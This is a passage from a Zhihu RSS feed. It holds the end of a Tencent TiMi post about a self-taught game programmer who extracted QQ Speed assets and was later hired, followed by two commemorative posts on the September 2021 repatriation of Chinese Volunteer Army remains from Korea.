吃饭咯！如果加班的话，公司是免费提供晚餐的，所以我晚上待到很晚，这样一天就有一顿饭吃。</p>\n<p>熬过一个月，工资到手，好像是3800多点。心里很高兴，毕竟是自己人生的第一份正式工作。</p>\n<p>这时候项目总监跟我说现在要去深圳封闭开发三个月，包吃住，让我也去。我别提多高兴了，有吃的，还免费住，多好的事啊，果断签字同意了。</p>\n<p>我们公司是跟深圳一家大公司合作，是在南山科技园。</p>\n<p>到了深圳，我站在公司阳台上，看到了腾讯大厦，老激动了！</p>\n<p>下了班，我和主程特地跑过去近距离的在门口转悠了一会儿。</p>\n<p>我：“如果有一天我也能进腾讯多好。”</p>\n<p>主程：“唉，腾讯学历要求很严格的。”</p>\n<p>这家公司真的特别大，有一次听同事说这公司有好几个阳台，另外一个阳台有健身器材。我想过去瞅瞅，结果在公司迷路了......</p>\n<p>他们公司每个星期五下午会有点心，有时候是蛋糕，有时候是水果。他们公司的员工感觉就像是吃腻了一样，一点反应都没有......我们团队的人老激动了，每个人都拿了好几盒，哈哈！</p>\n<p>我们每天八点半起床走路半个多小时到公司，来得早的话还有早餐吃，来得晚的话啥也没有了。</p>\n<p>晚上正常下班，但我们程序一般会更晚，我和主程还有技术总监总是最晚的三个，回去的路上大家一起讨论今天的技术难点，哪些地方没有实现，有什么好的思路，很累，但很充实。</p>\n<p>在深圳我就一直改bug，扩展原有的小的新功能，跟主程一起维护战斗系统。我的进步很快，不过我很满足，因为吃住不用愁。</p>\n<p>结果在深圳封闭开发了两个月我们就回上海了，原因不太好讲。</p>\n<p>回上海后我们在深圳辛辛苦苦开发了两个月的新玩法被老板直接停掉了。唉......</p>\n<p>在深圳两个月存了些钱，足够租房子的，我跟执行策划和专门做UI的程序员三个人合租了一套房子。</p>\n<p>我这一间估计有不到十平米，一张床，一个电脑桌，一个衣柜就塞满了，1600一个月。上海的房子真贵，贵的吓人......</p>\n<p>公司开始慢慢愿意让我做一些功能了，我上班一年，做了7、8个系统功能，自己感觉还是收获挺多的。</p>\n<p>其中有个功能，因为当时上面急着要这个新功能，我预估时间需要半个月，最快也得十天，项目总监说如果你能一个星期做完，我奖励你一个机械键盘，说到做到。</p>\n<p>然后我每天爆肝，把功能在一个星期内做完了，键盘真的到手了！正高兴呢，不知道谁说了一句这键盘仅仅是使用权！使用权！使用权！卧槽。</p>\n<p>不过后来想了想无所谓，一个键盘700块，我买得起！加班加点一个星期之内能做完，说明我如果想做，还是可以做到的，对自己也是一种锻炼。</p>\n<p>我经常留得很晚，每天晚上就基本只剩我和技术总监两个人。因为自己太笨了，东西安排的也多，时间也很紧张，所以没办法每天都要工作到那么晚。但很晚也有好处，可以跟项目总监交流学习。</p>\n<p>每当我写代码写累了或者感觉他写代码写累了，我就会主动去喊他透透气，顺便聊天问一些自己不懂的地方。</p>\n<p>他人很好，很耐心地解释给我听，教我原理！他好像什么都懂，问他什么都知道。那肯定了，不然人家咋能当技术总监呢。</p>\n<p>下半年我熟悉了这个游戏，做东西也慢慢快了起来！但是我还是很晚才回去，到家了也继续研究我的飞车。</p>\n<p>有次在网上瞎逛，看到一个QQ飞车道具城，网页里有好多飞车里面的道具，可以直接购买。</p>\n<p>我看到那么多道具图标，心想我遍历一下，那岂不是所有道具图标我都能得到了吗！正好gsa文件我解不开，干脆从网页里直接获取。于是写了一个小程序，通过道具地址+道具ID把所有道具图片资源都遍历下载了下来。</p>\n<p>哈哈，踏破铁鞋无觅处，得来全不费工夫。</p>\n<p>好事接二连三的发生，我在网上看到一坨代码，看起来像是解析某个图像的。我研究了一下，他解析的图像跟gsa文件的结构特别像！我又激动了。</p>\n<p>那些代码我不知道是用什么语言写的，但是我能看懂，我就把那些代码翻译成了C#代码。好多API不一样，一百来句代码我翻译成C#搞了好几个小时，终于能跑通了。</p>\n<p>把gsa文件读入进来解析试试！卧槽！成功了居然，居然把gsa文件给解析出来了。但是有色差，应该是代码写错了，找到问题所在，修复了这个bug，成功写出gsa解析器。我发现一个一个手动解析速度太慢，干脆递归遍历所有gsa，全部自动解析得了。</p>\n<p>就这样，我从网页上的一坨代码翻译成C#，做了一个gsa解析器，得到了飞车里所有高清图片资源。</p>\n<p>资源是拿到了，可是现在暂时不用，我现在是全心全意的在研究赛车漂移呢。以前我一直在研究WheelCollider，想用他做出飞车那样的效果，可是发现这个组件真的很蛋疼。</p>\n<p>很多东西我想改，但是不能改，因为我没代码啊。</p>\n<p>干脆一不做二不休，我放弃了WheelCollider，直接操作刚体，使用addforce模拟动力。</p>\n<p>轮胎悬挂全部都是模拟出来的假象，正像飞车那样，真实的赛车哪有那样的物理效果啊？都是模拟出来的假象。</p>\n<p>漂移也很轻松的做出来了感觉，但是离我想要的漂移还差得有些距离，不过没关系，我相信我肯定可以做出来，只是时间问题而已。</p>\n<p>匆匆忙忙又是一年，春节后回公司我就立即提交了离职申请，我不知道我当时为什么会这么急，只知道心里很乱、很烦。</p>\n<p>憋了一段时间后跟朋友提起这件事，朋友说我还是太年轻、太浮躁！或许吧！我也不知道。</p>\n<p>这是我的第一份正经工作，从进入公司的那天起，心里别提多高兴了，我终于也可以做游戏了，这对于我来说，真的好不容易。</p>\n<p>离开公司有多方面原因的，我最大的不舍就是技术总监老蒙和嘻嘻哈哈的团队。虽然跟策划撕逼，但是大家也是为了让游戏更好，私下都相处得不错的。</p>\n<p>技术总监老蒙帮助了我很多，从他身上我学到的不仅有技术，还有对待事情的态度。</p>\n<p>那天请吃离别饭，团队的二十多个人都到了，美术不熟，没叫。大家一起开开心心地吃饭。</p>\n<p>那天老蒙主动开了瓶啤酒，我很惊讶，老蒙从来没见过他喝酒的。平时工作累，身体太虚了，我喝了两瓶酒下肚，有点晕晕的。以前一个人能喝一箱，和以前比起来感觉差多了。</p>\n<p>我让老蒙旁边的程序坐到了我的位置上，跟老蒙聊着天。</p>\n<p>说着说着我不知道咋的就哭了，哭得话都说不清楚了。老蒙帮我真的太多，我没有什么能感谢他的，也只能希望在今后的路上自己更加努力，别让他失望。</p>\n<p>我交接工作文档写好的时候发给他，让他验收，他这才知道我要离职。我一直没勇气跟他说我要离职，我不知道怎么开口。</p>\n<p>他QQ收到了我的文档，过了好久，他才回复我：“你真的忍心抛下我们就这样走了吗？虽然说人各有志，但是我自私点，我还是希望你能留下来。”</p>\n<p>看到这句话，我心里更不是滋味！</p>\n<p>老蒙，你就当是我年少轻狂不懂事吧，对不起，做出这个让大家都难过的决定。如果有机会，我们以后再一起共事。</p>\n<p>裸辞后发现工作现在真的好难找！好多公司都倒闭了，市面上U3D程序一抓一大把。</p>\n<p>投了好多家简历，看见招人我就投，大多数都是投出去就没消息了。</p>\n<p>后来有一家公司愿意要我，叫我去面试。</p>\n<p>他听了我的介绍，说我是他见过路子最野的程序员，也是他见过的学历最低的程序员。听到这里，我以为又没戏了，可是他要我了，他表示他看好我，想试一试。</p>\n<p>好吧，既然这么看好我，那我也尽全力，争取不让看好我的人失望。</p>\n<p>在决定录用前，项目总监告诉我他们开了一个十年项目经验的程序员，还有个大厂出来的也被开了。</p>\n<p>我瞬间亚历山大，心想那么叼的人都被开，我这才一年工作经验，能胜任吗？</p>\n<p>我怕我把他们坑了，所以我告诉他，距离我入职还有十天时间，这十天我会做一个demo，如果达不到你们想要的效果，我就不入职了。</p>\n<p>他说不用给自己这么大压力的！可我是认真的。</p>\n<p>我花了三天时间做了一个demo，录制了视频发过去，他表示还不错，比之前的人做得好。</p>\n<p>得到认可，我心里总算舒缓一些了。</p>\n<p>做之前我心里也没底，甚至不知道自己能不能做出来。或许我只是用心尽全力去做了，技术跟他们相比我还差得太远太远。</p>\n<p>用心尽全力去做游戏，不能让看好我的人失望，不能让自己失望，仅此而已。</p>\n<p>这家公司到底能不能让我留下来，我不知道。在这种不确定的情绪里，我产生了个念头，开始在博客上写这篇文，回顾下这些年都经历了什么。</p>\n<p>不是我傲娇，只是很多时候我不甘于现状想往上爬，因为没有退路，掉下去就可能再也爬不上来了。</p>\n<p>等我哪天落魄了或者牛逼了，回头看看，或许才知道我年轻时的决定到底是对还是错。</p>\n<p>幸运的是，这家公司最后还是要了我，总共三个程序员，只有我有过赛车游戏的经验，负责开发赛车控制和玩法部分。</p>\n<p>工作还是很忙，但我已经习惯了这种节奏，只是有时感到比以前孤独，下班回到家就继续研究自己的游戏。</p>\n<p>有天凌晨，一个人突然加了我的QQ，联系我，说他是腾讯的。</p>\n<p>我心里一惊，觉得这肯定是个骗子，他又说了些事我才勉强相信，结果下一句又让我怀疑起来。</p>\n<p>他说《QQ飞车》项目组看到了你的博客，大家对你的经历很感兴趣，有没有空来深圳聊聊？</p>\n<p>我心想这该不会是要诓我过去，然后当场抓起来吧。毕竟我拿到的一些游戏资源，其实是反编译的，说不准会告我侵权，心里挺害怕的。</p>\n<p>但冷静之后想一想，我一没靠这东西盈利，二又穷得叮当响，想骗我也骗不到钱，能有什么损失？</p>\n<p>后面就买了机票，背着电脑来到深圳，好像又回到了跟着主程在深圳封闭开发，特地跑去腾讯大门口转悠的时候。</p>\n<p>来了之后发现没有骗我，也没有想象中的三堂会审，而是喊了超多人一起去吃饭，场面很壮观，对我态度也很亲切。作为一个《QQ飞车》的老玩家，我真是受宠若惊，后来才知道里面有那么多大佬。</p>\n<p>吃完饭他们带着我在工作室参观了一圈，也听我讲了自己的故事，在休闲区我把电脑打开，给他们展示了自己还不成熟的作品，但大家都很给面子，一个个排队试玩，让我高兴得头晕。</p>\n<p>他们鼓励我来应聘试试，我也认真准备了。后来回到上海，一边上班一边等消息，不敢抱希望，但又很不想失望，晚上辗转反侧。</p>\n<p>有天上班的时候接到电话，我好像有种预感，站起来接了，感觉难以置信，像梦里一样恍惚，居然真的有机会参与做官方的飞车手游，而不再是一个人的自娱自乐。</p>\n<p>就这样，我来到了天美。</p>\n<p>转眼已经过去了5年，我还是每天下班了会玩会飞车，我的企业微信签名也一直都是“疯狂漂移中...”。</p>\n<p>它成了一种习惯，一个第二世界，开发它的想法把我从最颓废的一年里拔了出来，学习编程技术，一步步走到今天，我也希望能继续看着它，能开向多远的未来。</p>\n<p><b>后记：</b></p>\n<p>《QQ飞车》项目组最初因博客上的文章注意到了“热心玩家”阿升，考虑到他的反编译行为未构成盈利，也未将破解资源向第三方公布，以及他个人研究的初衷，决定当面友好沟通。</p>\n<p>在面谈与体验他的《手机版QQ飞车》后，项目组更多被他作为老玩家的热忱所打动，最终决定不追责他的侵权行为，但仍保留权利，并鼓励他参与正式的应聘流程。阿升也最终成功通过社招，参与到官方版《QQ飞车手游》的研发中。</p>\n<p>未经软件著作权人许可，反编译软件资源并向第三方提供的，均属违法侵权行为，也是不被提倡的。希望有意参与研发过程的同学，都能努力提升自己，并参与正式的应聘流程，踏上青睐的职业道路！</p>\n<a href=\"https://www.zhihu.com/question/24665653/answer/1774740320\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-d2477d3da63f772ccf6f9d8703c75e9c_bh.jpg\" data-image-width=\"1080\" data-image-height=\"855\" class=\"internal\">在腾讯互娱（IEG）的工作是怎样一番体验？</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tian-mei-gong-zuo-shi-21?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">腾讯天美工作室群</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/289686285/answer/2101037072?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">16 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/48933183?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">自学编程想写游戏应该如何起步？</a><br><a href=\"http://www.zhihu.com/question/26723491?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想要去网易做游戏需要什么技能？</a><br>\n","link":"http://www.zhihu.com/question/289686285/answer/2101037072?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"109 名烈士终于回家，这是最好的开学第一课。从他们身上你感受到了什么？有什么想对他们说的 ？","date":"2021-09-03 08:31:24","description":"\n<p></p>\n<a href=\"https://www.zhihu.com/video/1417159814925905920\">山河无恙，英灵安息！</a><p>志愿军烈士祭文，听哭了！</p>\n<p>“魂兮归来，布奠倾觞”</p>\n<p>9月3日上午</p>\n<p>沈阳抗美援朝烈士陵园庄严而肃穆</p>\n<p>第八批在韩中国人民志愿军烈士遗骸</p>\n<p>安葬仪式在这里举行</p>\n<p><br></p>\n<p>天地英雄气，千秋尚凛然</p>\n<p>让我们一起送英烈最后一程</p>\n<p>愿他们在祖国的大地上安息</p>\n<p><b>致敬人民英雄永垂不朽！</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-tui-yi-jun-ren-80?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国退役军人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484341681/answer/2100938940?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">366 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/452226885?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">身边认识的人家中曾经出过烈士和英雄是一种怎样的体验？他们曾经有哪些感人的事迹或故事？</a><br><a href=\"http://www.zhihu.com/question/482921104?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9月2日，第八批在韩志愿军烈士遗骸运送回国，哪些志愿军的事迹令你印象最深，我们该如何铭记他们？</a><br>\n","link":"http://www.zhihu.com/question/484341681/answer/2100938940?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"109 名烈士终于回家，这是最好的开学第一课。从他们身上你感受到了什么？有什么想对他们说的 ？","date":"2021-09-03 03:10:00","description":"\n<p>9月2日，<b>是109名士兵回家的日子，第八批在韩志愿军烈士遗骸回国。</b></p>\n<p>遗骸迎回仪式，在沈阳桃仙国际机场举行。</p>\n<p>出征七十一年，落叶终于归根。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4b46c61acb343092f5db21485da893c8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"715\" data-rawheight=\"896\" data-watermark=\"watermark\" data-original-src=\"v2-4b46c61acb343092f5db21485da893c8\" data-watermark-src=\"v2-93b551b1f1c575fd3ebc62e9ddcf4aa8\" data-private-watermark-src=\"v2-c6d7afc189146b5370f6e62d053b0203\"></p>\n<p><b>9月1日，是孩子们开学的日子。</b></p>\n<p>并不是故意安排，却来得恰到好处。</p>\n<p><b>是时候了，让中国的孩子多一点血性，让中国的孩子多一点民族气节，让中国的孩子记住国家的英雄。</b></p>\n<p><b>这是给中国孩子最好的开学第一课。</b></p>\n<p><br></p>\n<p><b>01、回家</b></p>\n<p>从韩国仁川机场到中国沈阳桃仙机场，<b>回家的路是1小时25分钟，他们走了71年</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f8e9196313df9905b6fcf574a0aa50d2_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"351\" data-watermark=\"watermark\" data-original-src=\"v2-f8e9196313df9905b6fcf574a0aa50d2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-239c3f85bd3815295634931332aa0a5a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"586\" data-rawheight=\"322\" data-watermark=\"watermark\" data-original-src=\"v2-239c3f85bd3815295634931332aa0a5a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>9月2日上午，<b>109位志愿军烈士遗骸，及1226件相关遗物回到祖国。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-06529dc21777c7b18be474a205f35b9f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-06529dc21777c7b18be474a205f35b9f\" data-watermark-src=\"v2-0d1f55159d5b3b4a15e88ad35dc511e6\" data-private-watermark-src=\"v2-950fa53c6dc96e1a3409f790f01eaaef\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b300529e264df333384d397398bca865_720w.jpg?rss\" data-caption=\"12时37分，志愿军烈士遗骸迎回仪式在沈阳桃仙国际机场举行。退役军人事务部部长孙绍骋主持\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"734\" data-watermark=\"watermark\" data-original-src=\"v2-b300529e264df333384d397398bca865\" data-watermark-src=\"v2-1e3f5cc674b8d6de61d53cafa75216c4\" data-private-watermark-src=\"v2-acf91c9da9f0c1bdb2d7c879def311b8\"></p>\n<p>这条回家路走的很难。</p>\n<p>71年来，197653名牺牲在异乡的志愿军将士，都在等着回家与亲人“再会”。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-df82e1b6fa2908f0cf58b4529677f519_720w.jpg?rss\" data-caption=\"志愿军烈士遗物\" data-size=\"normal\" data-rawwidth=\"590\" data-rawheight=\"424\" data-watermark=\"watermark\" data-original-src=\"v2-df82e1b6fa2908f0cf58b4529677f519\" data-watermark-src=\"v2-30441598b3a3136d70baa0aee7532917\" data-private-watermark-src=\"v2-40f8329f17d025efeda2d6a4931fa048\"></p>\n<p>2013年6月，中韩经协商敲定，如果发现新的中国军人遗骸，每年定期归还中方，从2014年到2021年，共有8批共825名在韩志愿军烈士遗骸回国。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-56a0a70f4cb1308d73ba777fb2d8dbfd_720w.jpg?rss\" data-caption=\"第一批志愿军烈士遗骸归国\" data-size=\"normal\" data-rawwidth=\"641\" data-rawheight=\"727\" data-watermark=\"watermark\" data-original-src=\"v2-56a0a70f4cb1308d73ba777fb2d8dbfd\" data-watermark-src=\"v2-67afb6a2a961f83cb0f26e648da84595\" data-private-watermark-src=\"v2-d2883dad12746a7eea7821ec4db77b65\"></p>\n<p>离家时尚是少年，身后是刚刚建立的新中国。</p>\n<p>冲锋陷阵，视死如归。</p>\n<p>归来时骸骨盖着国旗，让人泪目，也让人心疼。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d8af5785dfe5f2c5c06c2c4b08aa4524_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"486\" data-watermark=\"watermark\" data-original-src=\"v2-d8af5785dfe5f2c5c06c2c4b08aa4524\" data-watermark-src=\"v2-9e17b2279890ff8f4e3377d8099c817b\" data-private-watermark-src=\"v2-6a03e6c03ad8b1e2dc59175e9f1bd389\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ce20aee68363beae5e5db56803e89a16_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"486\" data-watermark=\"watermark\" data-original-src=\"v2-ce20aee68363beae5e5db56803e89a16\" data-watermark-src=\"v2-f826c2248ed38a3dc8f8a48c09e15f5e\" data-private-watermark-src=\"v2-14bb5a9cbe6d510104333ff755393620\"></p>\n<p><br></p>\n<p>71年前他们告别的祖国如今早已山河无恙。</p>\n<p><b>这些故事，我们想让中国的孩子知道，眼前的繁华盛世，是一代又一代的先辈用生命换来的。</b></p>\n<p><br></p>\n<p><b>02、197653</b></p>\n<p>1950年10月19日，在鸭绿江畔，一支中国军队在黄昏中奔向遥远的战火。</p>\n<p>同一天，平壤被“联合国军”占领。局势到了最危急的时刻。</p>\n<p>“打得一拳开，免得百拳来”。于是，一次震惊世界的远征开始了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b03a0f2e9402c415ed0880cd8c90db3d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-b03a0f2e9402c415ed0880cd8c90db3d\" data-watermark-src=\"v2-617166320237e09cd08a40c8da91a530\" data-private-watermark-src=\"v2-bfb691121f983f69a00cd73e9fb9f2fb\"></p>\n<p>1950的中国，人均寿命35岁。人均钢铁产量只够打一把镰刀。这样一个亟待建设的国家，用她最优秀的儿女，去和当时世界装备最先进的军队决死一战。</p>\n<p>并且只用了三年时间把他们打到了谈判桌上。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8a8d2fad8b71330f7f443e80dd9ebf10_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"787\" data-rawheight=\"561\" data-watermark=\"watermark\" data-original-src=\"v2-8a8d2fad8b71330f7f443e80dd9ebf10\" data-watermark-src=\"v2-a2b251a3cf98a529fa9be42051ace7b5\" data-private-watermark-src=\"v2-16368dc6f47fef3a17dfb49127c3da42\"></p>\n<p><b>志愿军突破汉江防线</b></p>\n<p>然而，在鸭绿江畔留下背影的士兵中<b>有197653人再也没能踏上祖国的土地。</b></p>\n<p>这背后有多少奋不顾身的抉择，<b>这背后有多少生死决别的故事，我们想让中国的孩子知道。</b></p>\n<p><br></p>\n<p><b>03、礼遇</b></p>\n<p>各大媒体全程报道、全程直播，不落下英雄回家的任何一个细节，各个热搜榜都有他们的身影。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a6b6cb65079c192f0ac5ffd5f2f6162f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"1415\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>这让人感到欣慰，<b>国家的英雄，国家给予最高的礼遇。</b><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-77399a9ebaf27599923dafaacc9c62a5_720w.jpg?rss\" data-caption=\"国产运输机“鲲鹏”运-20全程护送\" data-size=\"normal\" data-rawwidth=\"856\" data-rawheight=\"584\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>深深的敬意藏在用心的细节里，</b>此次空军派出的运-20专机，<b>编号为08</b>特意为迎接第八次志愿军烈士遗骸归国准备。<br><br>运-20专机的机舱内部，特别安装了用于固定棺椁的装置，在每一个固定位的四周都加装了缓冲材质保证棺椁不被磕碰。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-878ca352ac49f288880dba0fa6502fc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-40112f9ab7fcc42d879215685175fe30_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>进入中国境内之后，中国空军的两架歼-11B战机伴飞护航。运-20与歼-11B飞行员在空中有一段对话让人破防<b>“奉命接迎志愿军烈士遗骸回国！”“欢迎志愿军忠烈归国我部歼-11B飞机两架奉命全程护航！”</b><br><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0b3fdacb3eb11e0c5637e6b17cd3351f_720w.jpg?rss\" data-caption=\"歼-11B战机超低空拉烟飞过\" data-size=\"normal\"></p>\n<p><br>回到70年前，1951年5月，抗美援朝战争进入相持阶段。人民空军开始以师为单位轮番入朝作战，成立不足两年的“雏鹰”要和世界最强空军争夺制空权，这是空战史上力量最悬殊的对决之一。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3b655fd2bab07e27f31fb1fcc4de89ef_720w.jpg?rss\" data-caption=\"首批参战的志愿军空军第4师第10团28大队\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"402\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>战争初期，美国在朝鲜投入飞机1200多架，而我空军作战飞机不足200架，比例为6:1。美军飞行员平均飞行时间1000小时，我军飞行员飞行时间最多也不到100小时，整体比例约为30:1。<br><b>如今，一支强大的人民空军护佑着我们的国家，可以打败一切来犯之敌。</b><br>正如空军航空兵某师参谋长丁毅，所说——<b>这是大国空军战略核心投送能力的实际体现。</b></p>\n<p><br><b>每思祖国金汤固，忆英雄铁甲寒。</b><br></p>\n<b></b><p><img src=\"https://pic2.zhimg.com/v2-f342c0e0562ea28a87cee13bb9388f73_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"779\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>我们想让中国的孩子知道，如今的中国有一支强大的人民军队，这是我们自信的来源。我们想让中国的孩子知道，每一个中国的年轻人，都有义务去保护这个国家。</b></p>\n<p><br></p>\n<p><b>04、永远年轻</b></p>\n<p><b>他们不再变老，</b>那些年轻的生命那些不为人知的名字为了身后的国家，视死如归。<br><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c639cd3b60c9993d006188ee08d2b7be_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8068fcbae9d4e46b732190e5c3cddcc5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br>而我要做的，是记住他们。我们若记得，他们便无悔<br><br><b>一位健在的志愿军战士说“那年我17岁，我没准备活，我们大家都准备死的”<br></b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9ddea46c462ab1f7a6abe6551d87e0d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\"></p>\n<p><br>如此青春的年纪如此慷慨的誓言，当之无愧，最可爱的人。<br><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b0c220cab7d76291751e7ff341894549_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a45be011d33026d2771b758c35a92bcd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"613\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>“你问我年轻是什么样子，我说和你一样啊”</b><br>和你一样的年纪，和你一样爱笑，和你一样意气风发。<br>我们想让中国的孩子认识，这些最可爱的人，知道他们的名字，知道他们的故事，知道青春除了诗和远方，还有家国和边关。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ecfaea245bee721660a83a65a9d835c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"484\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>当天，哨位君也在迎接仪式的现场，无数次泪目，无限感慨感觉时空转换。<br>哨位君的爷爷也是一位抗美援朝老兵，曾在朝鲜战场荣立二等功，眼前归来的是他并肩战斗的战友。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb590d24b473eee9a35abefba31d7bfd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"550\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>在沈阳抗美援朝烈士陵园门口，有一面留言墙，是退役军人事务部宣传中心所立<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5f61db159f319ce3be8c1b928bd23010_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>上面写满了大家给烈士们的留言，哨位君也留了一句话，是敬意、是怀念、是哀悼，也是无尽的感恩。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e28b0c97c13d34dabb8ff097b2e2f091_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>9月3日是志愿军烈士遗骸的安葬仪式，这个日子很巧合是抗日战争胜利日。再过半个月是九一八事变90周年纪念日，再过27天是烈士纪念日，再过28天是国庆节。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f747e4e23e3edf779a7d19ea806bc843_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"\" 